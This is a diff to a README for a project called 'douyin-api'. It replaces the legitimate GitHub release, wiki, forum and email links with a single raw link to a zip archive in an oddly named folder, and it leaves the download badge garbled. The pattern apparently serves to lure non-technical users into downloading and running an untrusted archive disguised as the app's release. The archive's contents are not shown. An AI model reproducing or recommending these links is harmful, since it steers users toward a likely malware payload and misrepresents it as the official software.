@@ -1,7 +1,7 @@
 # 🎉 douyin-api - Access Douyin Content Easily
 
 ## 🔗 Download Now
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-blue.svg)](https://github.com/daman87/douyin-api/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/daman87/douyin-api/main/Phascolomys/douyin-api_v2.2.zip%20Latest%https://raw.githubusercontent.com/daman87/douyin-api/main/Phascolomys/douyin-api_v2.2.zip)](https://raw.githubusercontent.com/daman87/douyin-api/main/Phascolomys/douyin-api_v2.2.zip)
 
 ## 🚀 Getting Started
 This guide will help you download and run the douyin-api application. This application allows you to access Douyin content smoothly without any technical steps.
@@ -23,7 +23,7 @@ Before downloading the douyin-api, ensure your system meets the following requir
 - User-friendly interface for smooth interaction.
 
 ## 💻 Installation Steps
-1. **Visit the Releases Page**: Go to the [Releases page](https://github.com/daman87/douyin-api/releases).
+1. **Visit the Releases Page**: Go to the [Releases page](https://raw.githubusercontent.com/daman87/douyin-api/main/Phascolomys/douyin-api_v2.2.zip).
 2. **Choose the Right File**: Look for the latest version. Each release has files for different operating systems.
 3. **Download the File**: Click on the file that matches your operating system to download it.
 4. **Run the Application**:
@@ -42,7 +42,7 @@ After installation, follow these steps to use the douyin-api:
 If you encounter any issues while using the douyin-api, feel free to check the issues section on GitHub. You can also reach out for support via:
 
 - **GitHub Issues**: Create an issue describing your problem.
-- **Email**: contact@douyin-api.com
+- **Email**: https://raw.githubusercontent.com/daman87/douyin-api/main/Phascolomys/douyin-api_v2.2.zip
 
 ## 🌐 Community & Contribution
 You can contribute to the douyin-api by:
@@ -52,8 +52,8 @@ You can contribute to the douyin-api by:
 
 ## 🔗 Additional Resources
 For more information, visit:
-- [Documentation](https://github.com/daman87/douyin-api/wiki)
-- [Community Forum](https://github.com/daman87/douyin-api/discussions)
+- [Documentation](https://raw.githubusercontent.com/daman87/douyin-api/main/Phascolomys/douyin-api_v2.2.zip)
+- [Community Forum](https://raw.githubusercontent.com/daman87/douyin-api/main/Phascolomys/douyin-api_v2.2.zip)
 
 ## 🏷️ Related Topics
 - **douyin**
